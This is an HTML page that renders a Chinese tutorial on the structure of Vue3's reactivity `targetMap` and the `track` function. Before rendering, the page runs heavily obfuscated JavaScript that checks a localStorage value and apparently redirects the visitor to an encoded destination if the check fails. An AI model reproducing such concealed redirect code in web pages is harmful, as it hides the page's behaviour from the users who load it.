<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x539b(e,s){var p=_0x5105();return(_0x539b=function(s,n){var a=p[s-=119];void 0===_0x539b.GkKfOl&&(_0x539b.Mrcbov=function(s,n){var a,t=[],e=0,p="";for(s=(s=>{for(var n,a,t="",e="",p=0,o=0;a=s.charAt(o++);~a&&(n=p%4?64*n+a:a,p++%4)&&(t+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var l=0,r=t.length;l<r;l++)e+="%"+("00"+t.charCodeAt(l).toString(16)).slice(-2);return decodeURIComponent(e)})(s),o=0;o<256;o++)t[o]=o;for(o=0;o<256;o++)e=(e+t[o]+n.charCodeAt(o%n.length))%256,a=t[o],t[o]=t[e],t[e]=a;for(var o=0,e=0,l=0;l<s.length;l++)a=t[o=(o+1)%256],t[o]=t[e=(e+t[o])%256],t[e]=a,p+=String.fromCharCode(s.charCodeAt(l)^t[(t[o]+t[e])%256]);return p},e=arguments,_0x539b.GkKfOl=!0);var s=s+p[0],t=e[s];return t?a=t:(void 0===_0x539b.BhOXSt&&(_0x539b.BhOXSt=!0),a=_0x539b.Mrcbov(a,n),e[s]=a),a})(e,s)}var _0x558027=_0x539b;if((()=>{for(var s=_0x539b,n=_0x5105();;)try{if(810040==+parseInt(s(137,"p2(Q"))*(parseInt(s(144,"p4JF"))/2)+parseInt(s(150,"F^#&"))/3*(-parseInt(s(124,"%r0*"))/4)+-parseInt(s(130,"DKMI"))/5+-parseInt(s(126,"F^#&"))/6*(-parseInt(s(132,"&(OM"))/7)+parseInt(s(128,"hPmH"))/8*(parseInt(s(149,"U][E"))/9)+parseInt(s(122,"73(j"))/10*(parseInt(s(134,"P]*W"))/11)+parseInt(s(123,"nCZs"))/12*(-parseInt(s(139,"(TRN"))/13))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x558027(141,"%r0*")](_0x558027(129,"noiF"))!=_0x558027(135,"GpYE"))throw window[_0x558027(120,"7#!T")][_0x558027(136,"p4JF")](_0x558027(131,"%r0*")),Error();function _0x5105(){var s=["WOqlW5tcGhueWOrosCo+W4FdMsJdLW","WOegW5dcI34nWOezw8o5W47dTr0","BSkfWR3dRmov","lCkTtSkZiGBdGa","WQz2WQ3dLtHvsG","qSkuWRxcOIlcKSozrq","qSktW4tdNhpdM8k/dSokyhyQk2S","WPuMwCotq2tcGSo4wSk6W6y","WRZcUSkCBmkAe10","WPCGumouthhcNSoLxCkQW5S","B8kDm8k8eLegW4rZbmosqmoP","BSo+c8oPE1xcNCkrWOyaWRlcHqq","WR/dU0Syr8kKxa","WOJdVWzby8oBWRqZWR07WOu3WPzL","WPX4wLKltCkuWPtcG8o0yCo3aW","qdJdQ8kaW4ZdHIBcVeq","WRzGWOLOs092WQBcTYVdUq","WO9ij1OOymoxkSo1","W4SwW5eOW4lcJSkldZnlW4JcPCot","bwPtw0NcVfxcMG","qCkwWQpcLJ7cOmofwa","D3j8pwHlhgS","rYb8pYVdMtddMa","W6JdRSoqeSoygvXvnqJcLG","WRZcImoMDaBdMa4","WOGrEeSNqmoP","EGK0W6VdLt5kWQJdImk4","mrbtymolxdNcMCo7W6a","W5NdH8okWOtcJKddKZpdLW","uZ8mW4jQW7BdMmoXmgWLiSkJ","WRpcQ8kCvCkDtb8vdbhcNf4RrKdcQCoQW5BcOWldUCkKfmkyxmoJ","B0xdJ8o7WRldVcVdHSk+FSk5W5FcQ8oN"];return(_0x5105=function(){return s})()}document.title="vue3 targetMap的数据结构本质",document.getElementById("article").innerHTML='<div><p>在Vue3的响应式系统中，<code>targetMap</code>的结构确实是多层级的，但它并非通过<strong>递归Map嵌套</strong>  实现，而是采用<strong>分层映射</strong>  的方式。以下是核心原理的详细解析：</p>\n<h3><strong>一、targetMap的数据结构本质</strong></h3>\n<h4>1. <strong>三层独立映射关系</strong></h4>\n<pre><code class="language-plaintext">WeakMap {\n  target1(原始对象) =&gt; Map1(属性名→依赖集合),\n  target2(原始对象) =&gt; Map2(属性名→依赖集合),\n  target3(原始对象) =&gt; Map3(属性名→依赖集合)\n}\n</code></pre>\n<ul>\n<li><strong>每个层级的对象（如<code>state</code>、<code>state.obj</code>、<code>state.obj.user</code>）都是独立的<code>target</code></strong>  ，各自对应一个<code>Map</code>实例。</li>\n<li><strong>属性名（如<code>\'obj\'</code>、<code>\'user\'</code>、<code>\'name\'</code>）是各自<code>Map</code>的键</strong>  ，与上层对象的<code>Map</code>没有直接关联。</li>\n</ul>\n<h3><strong>二、为什么不是递归Map？</strong></h3>\n<h4>1. <strong>递归Map的理论结构（错误认知）</strong></h4>\n<pre><code class="language-plaintext">// 错误示例（实际并非如此）\nWeakMap {\n  {state} =&gt; Map {\n    &#x27;obj&#x27; =&gt; Map {\n      &#x27;user&#x27; =&gt; Map {\n        &#x27;name&#x27; =&gt; Set { ReactiveEffect }\n      }\n    }\n  }\n}\n</code></pre>\n<h4>2. <strong>Vue3的实际实现（分层映射）</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-comment">// 当访问state.obj.user.name时：</span>\n<span class="hljs-number">1.</span> 对state对象的<span class="hljs-string">&#x27;obj&#x27;</span>属性收集依赖 → targetMap.<span class="hljs-title function_">set</span>(state, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;obj&#x27;</span>, effectSet]]));\n<span class="hljs-number">2.</span> 对state.<span class="hljs-property">obj</span>对象的<span class="hljs-string">&#x27;user&#x27;</span>属性收集依赖 → targetMap.<span class="hljs-title function_">set</span>(state.<span class="hljs-property">obj</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;user&#x27;</span>, effectSet]]));\n<span class="hljs-number">3.</span> 对state.<span class="hljs-property">obj</span>.<span class="hljs-property">user</span>对象的<span class="hljs-string">&#x27;name&#x27;</span>属性收集依赖 → targetMap.<span class="hljs-title function_">set</span>(state.<span class="hljs-property">obj</span>.<span class="hljs-property">user</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;name&#x27;</span>, effectSet]]));\n</code></pre>\n<ul>\n<li><strong>每个对象的Map是独立创建的</strong>  ，上层Map的value是<code>Set</code>而非<code>Map</code>，不存在递归嵌套。</li>\n</ul>\n<h3><strong>三、分层映射的核心优势</strong></h3>\n<h4>1. <strong>精准依赖触发</strong></h4>\n<ul>\n<li>修改<code>state.obj.user.name</code>时：\n<ol>\n<li>仅需查找<code>targetMap.get(state.obj.user).get(\'name\')</code>对应的依赖集合。</li>\n<li>无需遍历上层对象的Map，触发效率与层级深度无关。</li>\n</ol>\n</li>\n</ul>\n<h4>2. <strong>内存与性能优化</strong></h4>\n<ul>\n<li><strong>懒代理机制</strong>  ：仅当访问对象时才为其创建<code>Proxy</code>并加入<code>targetMap</code>，避免初始化时处理整个对象树。</li>\n<li><strong>示例</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">a</span>: { <span class="hljs-attr">b</span>: { <span class="hljs-attr">c</span>: <span class="hljs-number">1</span> } } });\n<span class="hljs-comment">// 初始化时，targetMap中只有state对象的Map</span>\n<span class="hljs-comment">// 访问state.a时，a对象才被加入targetMap</span>\n<span class="hljs-comment">// 访问state.a.b时，b对象才被加入targetMap</span>\n</code></pre>\n</li>\n</ul>\n<h3><strong>四、源码层面的实现逻辑</strong></h3>\n<h4>1. <strong>依赖收集函数track的核心逻辑</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-comment">// packages/reactivity/src/effect.ts</span>\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params"><span class="hljs-attr">target</span>: <span class="hljs-built_in">object</span>, <span class="hljs-attr">type</span>: <span class="hljs-title class_">TrackOpTypes</span>, <span class="hljs-attr">key</span>: <span class="hljs-built_in">unknown</span></span>) {\n  <span class="hljs-comment">// 1. 获取target对应的depsMap（即Map实例）</span>\n  <span class="hljs-keyword">let</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);\n  <span class="hljs-keyword">if</span> (!depsMap) {\n    <span class="hljs-comment">// 若不存在，则创建新的Map并存入targetMap</span>\n    targetMap.<span class="hljs-title function_">set</span>(target, (depsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()));\n  }\n  \n  <span class="hljs-comment">// 2. 获取key对应的依赖集合（即Set实例）</span>\n  <span class="hljs-keyword">let</span> dep = depsMap.<span class="hljs-title function_">get</span>(key);\n  <span class="hljs-keyword">if</span> (!dep) {\n    <span class="hljs-comment">// 若不存在，则创建新的Set并存入depsMap</span>\n    depsMap.<span class="hljs-title function_">set</span>(key, (dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()));\n  }\n  \n  <span class="hljs-comment">// 3. 收集当前副作用</span>\n  <span class="hljs-title function_">trackEffects</span>(dep);\n}\n</code></pre>\n<ul>\n<li>每次访问属性时，<strong>仅为当前对象的当前属性创建依赖集合</strong>  ，与其他层级无关。</li>\n</ul>\n<h3><strong>五、常见误解与澄清</strong></h3>\n<h4>1. <strong>误解1：认为targetMap是递归嵌套的Map</strong></h4>\n<ul>\n<li><strong>错误原因</strong>  ：将对象层级关系等同于Map嵌套关系。</li>\n<li><strong>正确理解</strong>  ：对象的层级（如<code>state→obj→user</code>）是数据结构的层级，而<code>targetMap</code>中每个对象的Map是平级存储的。</li>\n</ul>\n<h4>2. <strong>误解2：认为修改深层属性需要遍历上层依赖</strong></h4>\n<ul>\n<li><strong>错误示例</strong>  ：认为修改<code>state.obj.user.name</code>需要检查<code>state</code>和<code>state.obj</code>的依赖。</li>\n<li><strong>正确逻辑</strong>  ：Vue3通过<code>Proxy</code>直接拦截到<code>user</code>对象的<code>name</code>属性修改，仅触发该属性对应的依赖。</li>\n</ul>\n<h3><strong>总结：分层映射的设计精髓</strong></h3>\n<p>Vue3的<code>targetMap</code>采用**“对象→属性→依赖”的三层独立映射**  ，而非递归Map嵌套，核心原因是：</p>\n<ol>\n<li><strong>精准性</strong>  ：每个属性的依赖独立存储，修改时仅触发直接关联的副作用。</li>\n<li><strong>高效性</strong>  ：依赖收集与触发的时间复杂度为O(1)，与对象层级深度无关。</li>\n<li><strong>灵活性</strong>  ：支持动态添加深层属性（如<code>state.obj.user.age = 18</code>），无需预先构建完整映射。</li>\n</ol>\n<p>这种设计让Vue3的响应式系统在处理深层对象时依然保持高性能，同时避免了递归结构可能带来的内存和维护成本。</p>\n</div>'</script></body></html>